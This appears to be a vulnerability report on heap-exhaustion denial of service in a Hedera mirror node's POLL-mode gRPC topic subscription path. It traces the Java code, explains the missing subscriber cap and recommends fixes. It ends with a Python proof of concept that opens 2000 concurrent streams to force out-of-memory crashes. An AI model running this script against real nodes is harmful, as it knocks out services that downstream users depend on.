### Title
Unbounded Concurrent Subscriber Heap Exhaustion via `getResultList()` in POLL Mode

### Summary
`TopicMessageRepositoryCustomImpl.findByFilter()` uses `getResultList()` which materializes up to `maxPageSize` (default 5000) `TopicMessage` objects into heap memory per poll cycle. Because `TopicMessageServiceImpl` enforces no subscriber limit (the `subscriberCount` field is a metric gauge only, not a cap), an unprivileged attacker can open an arbitrary number of concurrent gRPC subscriptions, causing N × 5000 object heap allocations every 500 ms, leading to OOM and service crash.

### Finding Description

**Code path:**

`TopicMessageServiceImpl.subscribeTopic()` → `incomingMessages()` → `topicListener.listen(newFilter)` → `PollingTopicListener.listen()` → `poll()` → `topicMessageRepository.findByFilter(newFilter)` → `TopicMessageRepositoryCustomImpl.findByFilter()`.

**Root cause — `PollingTopicListener.poll()` (lines 51–62):**

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;                          // no-limit path
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize()); // capped at 5000
var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

`pageSize` is always ≤ 5000. The new filter has `limit = 5000`, so `hasLimit()` returns `true` and `setMaxResults(5000)` is called in the repository. **Per-subscriber allocation is bounded at 5000 objects.** The failed assumption is that this per-subscriber bound is sufficient protection — it is not, because there is no global subscriber cap.

**Root cause — `TopicMessageRepositoryCustomImpl.findByFilter()` (line 60):**

```java
return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
```

`getResultList()` eagerly materializes the full result set (up to 5000 `TopicMessage` objects) into a `java.util.List` on the JVM heap before returning. This is done once per poll interval (default 500 ms) per subscriber.

**No subscriber limit — `TopicMessageServiceImpl` (lines 48, 89–90):**

```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
// ...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```

`subscriberCount` is registered only as a Micrometer `Gauge` metric (lines 52–55). It is never checked against any maximum. Any number of concurrent gRPC subscriptions is accepted.

**Exploit flow:**

An attacker opens N concurrent `subscribeTopic` gRPC streams (no authentication required for a public mirror node) targeting a high-volume topic with no limit. Every 500 ms, each subscriber's poll cycle triggers a `getResultList()` call that allocates a `List<TopicMessage>` of up to 5000 objects. With N = 1000 concurrent subscribers, this is 5,000,000 `TopicMessage` objects instantiated every 500 ms, rapidly exhausting heap.

### Impact Explanation

Heap exhaustion causes `OutOfMemoryError`, crashing the gRPC service or triggering aggressive GC pauses that render it unresponsive. This is a non-network-based DoS: the attacker does not need to saturate bandwidth — they only need to hold open many long-lived gRPC streams. A crashed mirror node gRPC service denies all downstream consumers (wallets, dApps, exchanges) access to topic message data, which can affect consensus-layer observability for projects with significant market capitalization relying on this infrastructure.

### Likelihood Explanation

**Preconditions:**
- The listener must be configured with `type: POLL` (not the default `REDIS`). This is a deployment-specific configuration, reducing the default attack surface, but operators do use POLL mode (it is a documented option).
- The attacker needs only a network connection to the gRPC port — no credentials, no privileged account.

**Feasibility:** Opening thousands of gRPC streams is trivial with any gRPC client library. The attack is repeatable and requires no special knowledge beyond the public gRPC API (`subscribeTopic` with a valid `topicId`). The 500 ms poll interval means heap pressure is sustained continuously.

### Recommendation

1. **Enforce a global subscriber limit:** Add a configurable `maxSubscribers` to `ListenerProperties` and reject new subscriptions in `TopicMessageServiceImpl.subscribeTopic()` when `subscriberCount.get() >= maxSubscribers`.
2. **Per-topic subscriber limit:** Track subscribers per `topicId` and cap them independently to prevent a single topic from monopolizing resources.
3. **Replace `getResultList()` with a true streaming approach:** The comment on line 60 of `TopicMessageRepositoryCustomImpl` acknowledges `getResultStream()`'s cursor doesn't work with reactive streams. Consider using a `ScrollableResults`/`StatelessSession` with Hibernate, or a Spring Data `@Query` with `Stream<T>` backed by a server-side cursor (`setFetchSize`), to avoid full materialization.
4. **Rate-limit subscriptions per client IP/identity** at the gRPC interceptor layer.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

# Target: mirror node gRPC endpoint with POLL listener configured
channel_target = "mirror.node.host:5600"

def open_subscription():
    channel = grpc.insecure_channel(channel_target)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,   # any high-volume topic ID
        # limit intentionally omitted → no limit → maxPageSize=5000 per poll
    )
    for _ in stub.subscribeTopic(request):
        pass  # consume slowly or not at all to keep stream open

threads = [threading.Thread(target=open_subscription) for _ in range(2000)]
for t in threads:
    t.start()
# Result: 2000 × 5000 TopicMessage objects allocated every 500ms → OOM
```
